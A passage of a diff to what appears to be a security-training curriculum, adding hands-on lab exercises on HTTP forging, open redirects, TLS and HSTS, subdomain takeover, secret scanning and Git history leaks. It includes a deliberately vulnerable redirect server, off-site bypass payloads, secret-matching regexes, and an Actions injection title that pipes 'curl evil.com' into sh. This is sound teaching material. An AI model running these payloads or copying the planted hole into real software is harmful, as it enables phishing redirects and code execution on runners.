@@ -3696,8 +3696,141 @@ curl -i "https://httpbin.org/redirect-to?url=https://example.com"
 5. Shared caches/CDNs may store a cacheable response and serve it to a *different* user; \`no-store\` forbids storing it.
 </details>
 
+---
+
+### 🧪 Workbench: read a response, forge a request, break a redirect
+
+> **What this trains.** The module's claim is that an HTTP message is *just text you can read and rewrite*. These tasks make you do exactly that — read a real response, forge a request whose every part you chose, and then exploit the open-redirect pattern against a server you run. Everything is offline against \`example.com\` (read-only) and two tiny local servers, so nothing depends on a flaky public test site.
+
+**The rule:** for each task, predict the answer, then run it. For the reasoning task, write your answer before opening the walkthrough.
+
+#### 🟢 Drill 1 — read a response ~3 min
+
+**Goal.** Using only the always-present tool the module showed you, find two facts about what \`https://example.com\` returns: its **HTTP status code** and its **\`Content-Type\`** — without downloading and eyeballing the whole HTML body.
+
+**Done when.** You can state the status code (a 2xx) and the content type, and you know which line of the output each came from.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+curl -i https://example.com | head -5
+# HTTP/2 200            <- status line: version + code
+# content-type: text/html   <- a response header
+\`\`\`
+
+\`-i\` includes the response headers; piping to \`head\` keeps the body from scrolling past. The status line and header block are the two things a security engineer reads *first* on any response — before the body — because they tell you what happened and how the client will interpret what follows.
+
+**Thinking outside the box:** you were told to avoid the body, and \`head\` was one way. Did you find another? \`curl -I\` (capital i) issues a **HEAD** request — headers only, no body at all — which is the "proper" tool for this and a method the module listed (HEAD's cousin OPTIONS is in the methods table; HEAD behaves like GET but returns no body). Discovering \`-I\` yourself, or reaching for \`curl -sI … | grep -i content-type\`, both count — there's rarely one right command, and noticing that is the skill.
+</details>
+
+#### 🟢 Drill 2 — forge a request and prove the client owns it ~6 min
+
+Spin up a tiny echo server that simply reflects back whatever request it receives:
+
+\`\`\`bash
+mkdir -p ~/http-workbench && cd ~/http-workbench
+cat > echo-server.js <<'EOF'
+const http = require("http");
+http.createServer((req, res) => {
+  res.setHeader("Content-Type", "application/json");
+  res.end(JSON.stringify({ method: req.method, path: req.url, headers: req.headers }, null, 2));
+}).listen(4600, () => console.log("echo server on http://localhost:4600"));
+EOF
+node echo-server.js     # leave running; use a second terminal for curl
+\`\`\`
+
+**Goal.** Send **one** request that simultaneously: uses the \`DELETE\` method, carries a \`Cookie\` header of a value you invented, and carries a made-up custom header \`X-Secret\`. Confirm the server saw all three exactly as you set them.
+
+**Done when.** The echoed JSON shows \`"method": "DELETE"\`, your \`cookie\` value, and your \`x-secret\` value — proving, concretely, that method + headers + cookies are all yours to set.
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+The module's forge example set the method with one flag and added headers with a repeatable flag. You can stack as many of that header flag as you like on a single command. The cookie is *just another header* named \`Cookie\`.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+curl -s -X DELETE \\
+  -H 'Cookie: session=anything-i-want' \\
+  -H 'X-Secret: i-set-this' \\
+  http://localhost:4600/
+# ... "method": "DELETE", ... "cookie": "session=anything-i-want", ... "x-secret": "i-set-this"
+\`\`\`
+
+\`-X\` chooses the method; each \`-H\` adds one header; \`Cookie\` has no special status — it's a header like any other, which is why "the browser controls the cookie" is false the moment someone uses \`curl\`. This is "the client is attacker-controlled" (Module 0.3) made literal at the protocol level: there is **no part of a request the server receives that the client did not choose.** Every validation decision on the server must start from that fact — which is why the next task is about a server that forgot it.
+</details>
+
+#### 🔴 Break & Defend — the open redirect ~15 min
+
+Run a second tiny server with a login redirect that trusts its \`next\` parameter:
+
+\`\`\`bash
+cat > redirect-server.js <<'EOF'
+const http = require("http");
+const { URL } = require("url");
+http.createServer((req, res) => {
+  const u = new URL(req.url, "http://localhost:4601");
+  if (u.pathname === "/login") {
+    const next = u.searchParams.get("next") || "/";
+    res.statusCode = 302;                 // THE BUG: 'next' is trusted with no allow-list
+    res.setHeader("Location", next);
+    return res.end();
+  }
+  res.end("try /login?next=/dashboard");
+}).listen(4601, () => console.log("redirect server on http://localhost:4601"));
+EOF
+node redirect-server.js    # second terminal
+\`\`\`
+
+**Your task:**
+1. Write the request that turns this login endpoint into a redirect to an external site you don't control (imagine \`https://evil.example\` is a phishing lookalike). Confirm the \`302\` and the \`Location\`.
+2. In your journal: a developer tries to fix it with \`if (next.startsWith("http://localhost:4601")) allow\`. Find **at least two** inputs that defeat that check but still redirect the victim off-site.
+3. Write the actual fix, and say why it's a different *kind* of check than step 2's.
+
+**Done when.** You've produced the malicious redirect, your journal lists two working bypasses of the naive prefix check, and your fix validates against an **allow-list of destinations** (not a string prefix).
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+For the exploit: the endpoint hands whatever you put in \`next\` straight into \`Location\`. For the bypasses: a prefix check only inspects the *start* of the string — think about what a URL can contain *after* a host that looks right (an \`@\`, or a \`.\`), and what a browser does with a protocol-relative \`//host\`. For the fix: stop reasoning about the string's shape and start reasoning about *which specific destinations are permitted*.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your answer</summary>
+
+**1. The exploit:**
+\`\`\`bash
+curl -si "http://localhost:4601/login?next=https://evil.example" | grep -iE '^HTTP|^location'
+# HTTP/1.1 302 Found
+# Location: https://evil.example
+\`\`\`
+The victim clicks a link to \`localhost:4601\` (a site they trust) and lands on \`evil.example\`. The trust in the first domain is *transferred* to the destination — that's the whole scam, and it's why open redirect is a real finding even though "it's just a redirect."
+
+**2. Bypasses of \`startsWith("http://localhost:4601")\`** — each still sends the victim off-site:
+- \`next=http://localhost:4601.evil.example/\` — the string *starts with* the trusted prefix, but the real host is \`localhost:4601.evil.example\`, which belongs to the attacker.
+- \`next=http://localhost:4601@evil.example/\` — everything before an \`@\` in a URL is *userinfo*, not the host; the browser navigates to \`evil.example\`. Prefix check passes, victim leaves.
+- (Depending on how the value is used) \`next=//evil.example\` — a **protocol-relative** URL; browsers treat \`//host\` as "same scheme, new host," so it redirects off-site while not even starting with \`http\`.
+
+The lesson of step 2: **a prefix/substring check is reasoning about the *shape* of attacker-controlled text, and attacker-controlled text has more shapes than you enumerated.** This is the same losing game as blocklisting quotes to stop SQL injection (Module 0.5).
+
+**3. The fix — validate against an allow-list of permitted destinations, not the string:**
+\`\`\`js
+const ALLOWED = new Set(["/dashboard", "/account", "/"]);   // known-good relative paths
+const next = u.searchParams.get("next") || "/";
+const target = ALLOWED.has(next) ? next : "/";              // anything unknown -> safe default
+res.setHeader("Location", target);
+\`\`\`
+Why it's a *different kind* of check: step 2 asked "does this string look trusted?" (open-ended, bypassable). The allow-list asks "is this one of the exact destinations I decided are OK?" (closed set, nothing to bypass). If you must allow arbitrary internal paths, enforce that the value is a **relative path** — rejecting anything with a scheme, a host, or a leading \`//\` — which is the same principle: permit a known-safe *form*, don't try to blocklist dangerous ones. Clean up: \`Ctrl+C\` both servers when done.
+</details>
+
+---
+
 ➡️ **Next step:** HTTP rides on a connection that DNS sets up and TLS secures. Let's make those two trust steps concrete. Continue to **Module 1.2: DNS, TLS, and the Browser Connection**.`,
-    tracker: ["Can label the four parts of an HTTP request and response", "Ran curl -i and forged a POST with a custom Cookie header against my own server", "Watched a redirect and can explain open redirect + its allow-list defense", "Can map 401 vs 403 onto authentication vs authorization", "Answered the knowledge check"]
+    tracker: ["Can label the four parts of an HTTP request and response", "Ran curl -i and forged a POST with a custom Cookie header against my own server", "Watched a redirect and can explain open redirect + its allow-list defense", "Can map 401 vs 403 onto authentication vs authorization", "Answered the knowledge check", "Workbench: forged one request with a chosen method + cookie + custom header and saw the echo server confirm all three", "Workbench: exploited the open-redirect server, found two bypasses of a naive prefix check, and wrote the allow-list fix"]
   }, {
     id: "m1-2",
     phaseId: "p1",
@@ -3821,8 +3954,94 @@ If your OpenSSL is older than 3.5 it won't offer ML-KEM groups — that itself i
 7. Crypto-agility means your system can swap cryptographic algorithms or key sizes without a rewrite. Concrete practices: don't hard-code cipher/curve/key-size choices scattered across the codebase — centralize them behind config; keep TLS libraries current so they can negotiate hybrid post-quantum groups (e.g. X25519MLKEM768); maintain an inventory of every place you use asymmetric crypto (TLS, JWT signing, SSH, code signing) as your migration plan.
 </details>
 
+---
+
+### 🧪 Workbench: read the proof, then find the dangling name
+
+> **What this trains.** Module 0.2 gave you the slogan "names are claims, certificates are proof." Here you *operate* it: pull a real certificate apart, tell at a glance whether a site forces HTTPS, and reason your way through the DNS bug you're most likely to cause yourself. All tasks are read-only against public infrastructure (standard and fine), and their outputs change over time — so the "Done when" checks describe the *shape* of a right answer, not fixed values.
+
+**The rule:** predict what each command will reveal before you run it; write the reasoning task's answer before opening the walkthrough.
+
+#### 🟢 Drill 1 — pull a certificate apart ~5 min
+
+**Goal.** For \`example.com\`, find three facts *from the certificate itself*: who it's **for** (subject), which **CA** signed it (issuer), and the date it **expires** (notAfter).
+
+**Done when.** You can name the issuing CA and the expiry date, and you understand why the *subject* is the field that would fail for an attacker who hijacked DNS.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \\
+  | openssl x509 -noout -subject -issuer -dates
+# subject=CN=example.com
+# issuer=... CN=<some CA>
+# notBefore=... / notAfter=<expiry>   (your dates will differ)
+\`\`\`
+
+The \`subject\` is the whole game: it's the name the certificate is *for*, and a CA only issues it after verifying you control that name. This is why "DNS can lie" doesn't break HTTPS — an attacker can route you to their IP, but they can't obtain a valid, trusted-CA-signed certificate whose subject is \`example.com\`, so the browser refuses the connection. The \`notAfter\` date matters operationally: an **expired** certificate is one of the most common self-inflicted outages, and monitoring it is a real security control (Module 8.2).
+
+**Outside the box:** \`-servername example.com\` sends **SNI** — try dropping it, or pointing at a big shared host, and watch which certificate you get back. One IP can serve many sites, and SNI is how you tell the server which name you're asking about — the same mechanism a scanner uses to enumerate what's hosted where.
+</details>
+
+#### 🟢 Drill 2 — who forces HTTPS, and who doesn't ~4 min
+
+**Goal.** Using the header the module showed you, determine which of \`https://github.com\` and \`https://example.com\` instructs browsers to *only ever* use HTTPS — and which leaves the first plaintext request exposed.
+
+**Done when.** You can say which site sends the HSTS header (and roughly what its \`max-age\` is), which doesn't, and what concretely goes wrong for the site that doesn't.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+curl -sI https://github.com  | grep -i strict-transport-security   # present: max-age=..., often preload
+curl -sI https://example.com | grep -i strict-transport-security || echo "no HSTS header"
+\`\`\`
+
+GitHub sends \`Strict-Transport-Security\` with a long \`max-age\` (and \`preload\`); \`example.com\` sends nothing. The gap this exposes: when a user types a bare \`example.com\` (no \`https://\`), the *first* request can leave as plain HTTP and be hijacked *before* any HTTP→HTTPS redirect fires. HSTS closes that window by making the browser upgrade to HTTPS on its own, before sending anything — which is why "we redirect HTTP to HTTPS" is not a substitute for HSTS. \`preload\` goes further: the browser ships knowing to use HTTPS even on the very first-ever visit.
+</details>
+
+#### 🔴 Break & Defend — the dangling CNAME ~15 min
+
+**Goal.** Practice *reading* a CNAME chain, then reason through the subdomain-takeover bug end to end.
+
+1. Run a query that shows a real **CNAME** alias resolving to its final address (the module named a good example):
+   \`\`\`bash
+   dig +noall +answer www.github.com    # note the CNAME line, then the resolved A record
+   \`\`\`
+2. In your journal, walk the takeover: you CNAME \`shop.yoursite.com\` to a hosting provider, later stop paying for that provider, but leave the DNS record. Explain, step by step, how an attacker ends up serving content from \`shop.yoursite.com\`, and state the **one-sentence root cause**.
+3. Name the fix, and the *cheapest routine* that would have caught the dangling record before an attacker did.
+
+**Done when.** Your journal explains why the takeover puts attacker content under *your* trusted domain (and why that's worse than a random evil domain), names the root cause as "a DNS record outliving the resource it pointed to," and proposes deleting records at decommission plus a periodic audit.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+The key insight is *who can claim the name on the provider's side* once you've stopped using it. The DNS record still says "\`shop.yoursite.com\` is really \`something.provider.io\`" — but if nobody owns \`something.provider.io\` on the provider anymore, the next person to register it inherits all traffic your DNS is still sending there.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your answer</summary>
+
+**The chain:** your CNAME says \`shop.yoursite.com → your-app.provider.io\`. You cancel the provider account, so \`your-app.provider.io\` becomes unclaimed — **but you never delete the CNAME.** An attacker registers \`your-app.provider.io\` on that same provider (it's free to claim now), and because your DNS still points \`shop.yoursite.com\` there, every visitor to \`shop.yoursite.com\` is served the attacker's content — with a *valid TLS certificate*, because the attacker legitimately controls the provider endpoint the name resolves to.
+
+**Why it's worse than a plain evil domain:** the content is under *your* trusted name. Cookies scoped to \`yoursite.com\` may be readable; users, password managers, and other subdomains trust it; a phishing page there is far more convincing than \`evil.example\`. The domain's reputation is the attacker's weapon.
+
+**Root cause (one sentence):** a DNS record outlived the resource it pointed to. **Fix:** delete DNS records as part of decommissioning anything they reference — make it a step in the teardown checklist, not an afterthought.
+
+**Outside the box — the cheap routine that catches it:** you don't audit dangling CNAMEs by hand. You script the loop the module's tools already give you:
+\`\`\`bash
+for sub in www shop blog status cdn app; do
+  echo -n "$sub: "; dig +short CNAME "$sub.yoursite.com" || echo "(none)"
+done
+\`\`\`
+Any CNAME pointing at a provider you no longer use is a candidate takeover. This is exactly the "extract a field, loop over inputs" shape from the Phase 0 Workbenches, pointed at DNS — and it generalizes to certificate-expiry monitoring (loop \`openssl … -enddate\` over your hosts) and any other "check the same thing across many targets" audit.
+</details>
+
+---
+
 ➡️ **Next step:** You can read the protocols; now sharpen the terminal skills that turn observation into investigation. Continue to **Module 1.3: CLI for Security Work**.`,
-    tracker: ["Ran dig for A/AAAA/TXT/MX/CNAME records and read the openssl certificate chain", "Can explain the three TLS guarantees and which closes the DNS-can-lie gap", "Can walk through a subdomain takeover and name its root cause", "Checked a site for the HSTS header", "Can explain harvest-now-decrypt-later and what crypto-agility means for a developer", "Answered the knowledge check"]
+    tracker: ["Ran dig for A/AAAA/TXT/MX/CNAME records and read the openssl certificate chain", "Can explain the three TLS guarantees and which closes the DNS-can-lie gap", "Can walk through a subdomain takeover and name its root cause", "Checked a site for the HSTS header", "Can explain harvest-now-decrypt-later and what crypto-agility means for a developer", "Answered the knowledge check", "Workbench: read a real certificate's subject/issuer/expiry and contrasted an HSTS vs non-HSTS site", "Workbench: read a CNAME chain with dig and journalled the subdomain-takeover chain, root cause, fix, and a loop to detect dangling records"]
   }, {
     id: "m1-3",
     phaseId: "p1",
@@ -3903,8 +4122,114 @@ printenv | rg -i "path|home" | head   # see real env vars on your machine (read-
 5. Any two of: committed Git history, application logs, error pages/stack traces, screenshots, chat/issue trackers, shell history, debug endpoints dumping \`process.env\`.
 </details>
 
+---
+
+### 🧪 Workbench: hunt the secret, including where it hides
+
+> **What this trains.** The module's lesson is that *secrets leak through the boring channels* and the terminal turns an hour of clicking into a one-line answer. Here you write the search yourself (not copy it), then learn the harder half: a search is only as good as the places it looks. Everything runs against a fake project you build on your own machine.
+
+**The rule:** write the command before opening any walkthrough. If \`rg\` isn't installed, \`grep -rniE\` does the same job everywhere in this Workbench.
+
+#### 🟢 Drill 1 — write the secret sweep from scratch ~6 min
+
+Build a small project with three planted (fake) secrets in three different kinds of file:
+
+\`\`\`bash
+mkdir -p ~/hunt-workbench/src ~/hunt-workbench/logs && cd ~/hunt-workbench
+printf 'PORT=3000\\nDATABASE_URL=postgres://app:hunter2@localhost/app\\nSTRIPE_KEY=sk_test_FAKE123\\n' > .env
+printf 'console.log("starting app");\\nconst apiKey = "aB3xQ9mK7pL2vN8wZ4tR6yU1sD5fG0hJ";\\n' > src/app.js
+printf '2026-07-22 10:00:01 INFO login ok\\n2026-07-22 10:00:02 DEBUG authorization: Bearer sk_live_FAKE_leaked_in_log\\n' > logs/app.log
+\`\`\`
+
+**Goal.** Write **one** search command that finds all three secret-shaped strings *and* tells you the file and line number of each — without naming the files yourself.
+
+**Done when.** Your single command reports a hit in \`.env\`, in \`src/app.js\`, and in \`logs/app.log\`, each with a line number.
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+The module gave you the secret-pattern one-liner. Two things make it *pinpoint* rather than just *match*: the flag that adds line numbers, and a pattern with enough alternatives (\`password|secret|token|api[_-]?key|sk_...|bearer\`) to catch all three shapes. Recurse from \`.\`, case-insensitive.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+rg -ni "password|secret|token|api[_-]?key|sk_(live|test)|bearer" .
+# or, identically:
+grep -rniE "password|secret|token|api[_-]?key|sk_(live|test)|bearer" .
+# .env:3:STRIPE_KEY=sk_test_FAKE123
+# src/app.js:2:const apiKey = "aB3xQ9mK7pL2vN8wZ4tR6yU1sD5fG0hJ"
+# logs/app.log:2:... authorization: Bearer sk_live_FAKE_leaked_in_log
+\`\`\`
+
+The \`-n\` (line numbers) is what turns "there's a secret somewhere" into "the secret is at \`src/app.js:2\`" — an address you can act on. The alternation in the pattern is doing the real work: \`api[_-]?key\` matches \`apiKey\`, \`api_key\`, and \`api-key\`; \`sk_(live|test)\` matches the payment-key shape. This *is* how a leaked-repo attacker and a secret scanner both operate — the secret was never hidden, only unsearched.
+</details>
+
+#### 🟢 Drill 2 — the search that looks in the wrong places ~5 min
+
+A teammate says "I scanned all our source files, we're clean." They ran, effectively:
+
+\`\`\`bash
+rg -ni "sk_(live|test)" --glob '*.js'      # grep --include='*.js' does the same
+\`\`\`
+
+**Goal.** Run that search against your \`~/hunt-workbench\`, see what it reports, then explain in one sentence why it's dangerously reassuring — and produce the search that *does* catch the leak it missed.
+
+**Done when.** You can state that the source-only scan finds **nothing** here even though a live-key is leaking, and you have a command that surfaces the \`logs/app.log\` leak.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+The \`--glob '*.js'\` scan prints **nothing** — and that empty output is the trap: it *feels* like "all clear," but the most dangerous secret in the project (\`sk_live_...\`, a *live* key) is sitting in \`logs/app.log\`, which the scan never looked at. Drop the file filter and it appears immediately:
+
+\`\`\`bash
+rg -ni "sk_(live|test)" .        # no --glob: searches everything
+# logs/app.log:2:... Bearer sk_live_FAKE_leaked_in_log
+\`\`\`
+
+**The lesson: a clean result only means "clean *in the places you searched*."** Secrets leak through the boring channels precisely *because* people scan the obvious ones. Logs, \`.env\` files, config, commit history, \`.log\`/\`.bak\`/\`.old\` files, and screenshots are where the real leaks live. When someone says "the scan is clean," the security question is always *"what did the scan not look at?"*
+</details>
+
+#### 🔴 Break & Defend — a leak-catcher you'd actually keep ~12 min
+
+**Goal.** Write a small reusable check — a one-liner or a few-line script — that a developer could run before committing, which **exits non-zero** if anything secret-shaped is found in the working tree, and prints where. Then, in your journal, name its blind spots honestly.
+
+**Done when.** Running your check on \`~/hunt-workbench\` reports the leaks and returns a failing exit code (\`echo $?\` shows non-zero); running it on a truly clean folder returns success; and your journal lists at least **two** things your regex check will *miss* or *false-positive* on.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+\`grep\`/\`rg\` already set their exit code by whether they matched (match = 0). You want the *opposite* for a "fail the commit" gate: found-a-secret should be a *failure*. Invert it, or test the match count. For the blind spots, think about a random 32-char string with no \`key=\` label, and about a test file that legitimately contains \`password = "test123"\`.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your check</summary>
+
+\`\`\`bash
+# secret-check.sh — exit 1 if anything secret-shaped is present
+if rg -ni "password|secret|token|api[_-]?key|sk_(live|test)|-----BEGIN.*PRIVATE KEY-----" . ; then
+  echo "❌ possible secret found — do not commit" >&2
+  exit 1
+else
+  echo "✅ no obvious secrets"
+  exit 0
+fi
+\`\`\`
+\`rg\`/\`grep\` return 0 when they match, so a bare \`if rg ...\` runs the "found a secret → fail" branch exactly when there's a hit. (A stricter real gate scans only *staged* files: \`git diff --cached --name-only | xargs rg -ni "<pattern>"\`.)
+
+**The blind spots — and why naming them is the point:**
+- **High-entropy secrets with no label.** A bare \`aB3xQ9mK7pL2vN8wZ4tR6yU1sD5fG0hJ\` with no \`key=\` next to it won't match a keyword pattern. Real scanners add **entropy detection** (flagging random-looking strings) — which is exactly why Module 1.5 reaches for a purpose-built tool (\`gitleaks\`) instead of trusting hand-written grep.
+- **False positives.** A test fixture with \`password = "test123"\` or a doc example will trip the check and train people to ignore it — the fastest way to kill a security control is to make it cry wolf. Real tools support allow-lists/\`.gitleaksignore\` for exactly this.
+- **It only sees the working tree, not history.** A secret you committed last month and "deleted" is still in \`git log\` — the single most important boring channel, and the whole subject of the next module.
+
+The honest takeaway: a regex sweep is a genuinely useful *first* line — cheap, instant, catches the obvious 80% — but "no regex match" is not "no secret." Knowing *why* it's insufficient is what lets you reach for entropy scanning and history scanning at the right moment instead of trusting a green check. That progression — hand grep → dedicated scanner → history scanner → CI gate — is Modules 1.3 → 1.4 → 1.5 in one sentence.
+</details>
+
+---
+
 ➡️ **Next step:** The most common "boring channel" for a catastrophic leak is Git itself. Let's make sure secrets never enter your history. Continue to **Module 1.4: Git and GitHub Security Basics**.`,
-    tracker: ["Built the cli-lab folder and found the planted apiKey secret with rg -n", "Set the .env to chmod 600 and confirmed -rw-------", "Can write the secret-pattern search one-liner from memory", "Can name two 'boring channels' secrets leak through", "Answered the knowledge check"]
+    tracker: ["Built the cli-lab folder and found the planted apiKey secret with rg -n", "Set the .env to chmod 600 and confirmed -rw-------", "Can write the secret-pattern search one-liner from memory", "Can name two 'boring channels' secrets leak through", "Answered the knowledge check", "Workbench: wrote my own file+line secret sweep and saw a source-only scan miss a live-key leaking through a log", "Workbench: built a non-zero-exit leak-catcher and journalled two of its blind spots (entropy, false positives, history)"]
   }, {
     id: "m1-4",
     phaseId: "p1",
@@ -3996,8 +4321,94 @@ npm audit fix --dry-run # shows what bumping would change WITHOUT applying it
 5. Any three of: issues/PR comments, logs, screenshots, chat (Slack/Discord), support tickets, commit messages.
 </details>
 
+---
+
+### 🧪 Workbench: prove "deleted" isn't gone
+
+> **What this trains.** The module's central claim is easy to nod along to and hard to believe until you've done it: **a secret committed to Git is permanent, and removing it in a later commit does not remove it.** So you're going to commit a secret, "fix" it, and then recover it from your own history — because feeling that once changes how carefully you treat every commit forever. All local, on a throwaway repo.
+
+**The rule:** predict the result before each command. For the recovery step especially — predict whether you'll be able to get the secret back *after* you've "deleted" it.
+
+#### 🟢 Drill 1 — the safety net, set up right ~5 min
+
+**Goal.** Create a repo where a secret file is ignored *before the first commit*, and prove the ignore worked.
+
+\`\`\`bash
+mkdir -p ~/git-workbench && cd ~/git-workbench
+git init -q
+printf 'DB_PASSWORD=not-a-real-password\\n' > .env
+printf 'console.log("app");\\n' > app.js
+\`\`\`
+
+Now: make Git ignore \`.env\`, stage everything, and confirm \`.env\` did **not** get staged.
+
+**Done when.** \`git status\` shows \`app.js\` and \`.gitignore\` staged but **no \`.env\`**.
+
+<details>
+<summary>Walkthrough — open after you've run your own attempt</summary>
+
+\`\`\`bash
+printf ".env\\nnode_modules/\\n" > .gitignore   # ignore BEFORE the first commit
+git add .
+git status        # .env is absent from the staged list — that's the win
+\`\`\`
+
+The ordering is the entire point: \`.gitignore\` only prevents a file from being *newly* tracked. If you had \`git add\`-ed \`.env\` first and committed, adding it to \`.gitignore\` afterward would do nothing — it's already in history (which is exactly the trap the next task walks into deliberately). "Ignore secret files before the first commit" is a sequence, not just a config.
+</details>
+
+#### 🔴 Break & Defend — commit a secret, then try to erase it ~15 min
+
+This time, do the wrong thing on purpose, in a tracked file, so you can see what "permanent" really means.
+
+\`\`\`bash
+cd ~/git-workbench
+printf 'const KEY = "sk_live_FAKE_committed_by_mistake";\\n' > config.js
+git add config.js && git commit -q -m "add config"
+\`\`\`
+
+**Your task:**
+1. "Fix" the leak the way a beginner would: edit \`config.js\` so the secret is gone (read it from an env var instead), and commit that fix. Confirm the **current working file** no longer contains the secret.
+2. Now **recover the secret anyway**, using only Git — proving it survived your "deletion." Predict first whether you'll succeed.
+3. In your journal: given that the secret is recoverable, what is the *actually correct* response the moment you realize a secret was committed? And why is even rewriting history (BFG / \`git filter-repo\`) not a complete fix on its own?
+
+**Done when.** Your current \`config.js\` is clean, yet a Git command prints \`sk_live_FAKE_committed_by_mistake\` straight out of history — and your journal names **rotation** as the real fix and explains why.
+
+<details>
+<summary>Nudge — open if you've been stuck more than three minutes</summary>
+
+Your fix added a *new* snapshot on top; the old snapshot is still there, addressable. Git can show you any file as it existed in a past commit, and it can search *every* commit's content. Think "show me \`config.js\` as of the commit *before* HEAD," or "search all history for this string."
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your answer</summary>
+
+**1. The beginner "fix":**
+\`\`\`bash
+printf 'const KEY = process.env.KEY;  // moved to env\\n' > config.js
+git add config.js && git commit -q -m "remove hardcoded secret"
+grep sk_live config.js || echo "current file is clean"   # clean — looks fixed!
+\`\`\`
+
+**2. Recover it anyway — any of these works:**
+\`\`\`bash
+git show HEAD~1:config.js                 # the file exactly as the previous commit stored it
+# const KEY = "sk_live_FAKE_committed_by_mistake";
+
+git log --all -p -S 'sk_live' --oneline   # -S pickaxe: every commit that added/removed the string
+git rev-list --all | xargs git grep -i sk_live   # grep across ALL commits at once
+\`\`\`
+The working tree is spotless and the secret is *right there* in \`HEAD~1\`. This is not a trick — it's how Git is designed: commits are immutable snapshots, and "removing" a line just records a new snapshot without it. Every clone of this repo, every fork, and GitHub's own storage all still hold that old commit. (Note the zsh gotcha: use \`HEAD~1:config.js\`, not \`$hash:config.js\` — in zsh the \`:c\` after a variable is parsed as a modifier and mangles the path.)
+
+**3. The correct response — rotate, immediately:**
+The instant a secret hits a repo you must treat it as **compromised** and **rotate** it: revoke the leaked credential and issue a new one. That's the only action that actually helps, because — as you just proved — the exposed value is recoverable by anyone who ever had the repo. Rewriting history (BFG, \`git filter-repo\`) is worth doing to stop *future* exposure, but it is **not** sufficient on its own, for two reasons: (a) the secret was already public/clonable for some window, so you must assume it was harvested — GitHub-scanning bots find live keys in *seconds*; and (b) history rewrites don't reach forks, clones, caches, or CI logs that already copied it. Rotation invalidates the secret everywhere at once; history-cleaning only tidies your copy.
+
+**Outside the box — this is why the tooling escalates.** \`.gitignore\` (Drill 1) stops *whole files*. A scanner like \`gitleaks\` (this module's lab) catches secrets *inside tracked files* before they're pushed. But the failure you just staged — a secret already in history — is why real teams run \`gitleaks detect\` over the **full history**, not just the working tree, and gate pushes in CI (Module 1.5). Each tool covers a gap the previous one leaves; none is the whole answer, which is the recurring shape of real security.
+</details>
+
+---
+
 ➡️ **Next step:** You can keep secrets out of a single commit and audit a dependency by hand. The bigger risk lives one layer up — the CI/CD pipeline itself. Continue to **Module 1.5: Advanced GitHub Security — Actions, Signing, and SLSA**.`,
-    tracker: ["git init'd cli-lab with .gitignore before first commit; confirmed .env not staged", "Ran gitleaks and saw it flag the hard-coded key inside tracked code", "Ran npm audit on an old lodash and read the CVE output", "Can explain why a committed secret must be rotated even after deletion", "Answered the knowledge check"]
+    tracker: ["git init'd cli-lab with .gitignore before first commit; confirmed .env not staged", "Ran gitleaks and saw it flag the hard-coded key inside tracked code", "Ran npm audit on an old lodash and read the CVE output", "Can explain why a committed secret must be rotated even after deletion", "Answered the knowledge check", "Workbench: committed a secret, 'removed' it in a new commit, then recovered it from history with git show HEAD~1 / -S pickaxe", "Workbench: journalled why rotation (not history-rewriting) is the real fix, and how the tooling escalates .gitignore → gitleaks → history scan → CI"]
   },
   {
     id: "m1-5",
@@ -4145,6 +4556,96 @@ If your repo is public (or your org has GHAS):
 2. \`pull_request\` from a fork runs in a restricted sandbox: no write permissions, no access to secrets. \`pull_request_target\` always runs in the context of the *base* repository (with write permissions and secrets) even when triggered by a fork PR. Checking out and running untrusted fork code inside a \`pull_request_target\` workflow is effectively remote code execution with full repository write access.
 </details>
 
+---
+
+### 🧪 Workbench: review the pipeline like an attacker reads it
+
+> **What this trains.** Actions attacks don't show up when you *run* a workflow — they show up when you *read* one and spot the line that hands an attacker your runner. So this Workbench is a code-review muscle: you fix a vulnerable workflow yourself, then audit one with several planted flaws. There's no runner to lean on; the "Done when" is a property of the YAML you can verify by eye. Write your fix in your journal (or a scratch \`.yml\`) before opening any walkthrough.
+
+#### 🟢 Drill 1 — defuse the injection ~6 min
+
+Here is a workflow step that runs on every new issue:
+
+\`\`\`yaml
+- name: Greet the reporter
+  run: |
+    echo "Thanks for filing: \${{ github.event.issue.title }}"
+\`\`\`
+
+**Goal.** Rewrite this step so an attacker who files an issue titled \`hi\$(curl evil.com | sh)\` cannot get that command to execute on the runner — using the pattern the module taught, not by trying to sanitize the title.
+
+**Done when.** In your rewrite, the \`\${{ ... }}\` expression appears **only** under an \`env:\` key, and the \`run:\` line references a shell variable instead — so the shell never parses the attacker's text as code.
+
+<details>
+<summary>Nudge — open if you've been stuck more than two minutes</summary>
+
+The danger is that \`\${{ github.event.issue.title }}\` is expanded by GitHub *into the script text* before the shell runs — so the title becomes part of the command. Move the expansion off the \`run\` line: bind it to an environment variable, and have \`run\` read that variable the ordinary shell way.
+</details>
+
+<details>
+<summary>Walkthrough — open after you've written your fix</summary>
+
+\`\`\`yaml
+- name: Greet the reporter
+  run: |
+    echo "Thanks for filing: $ISSUE_TITLE"
+  env:
+    ISSUE_TITLE: \${{ github.event.issue.title }}
+\`\`\`
+
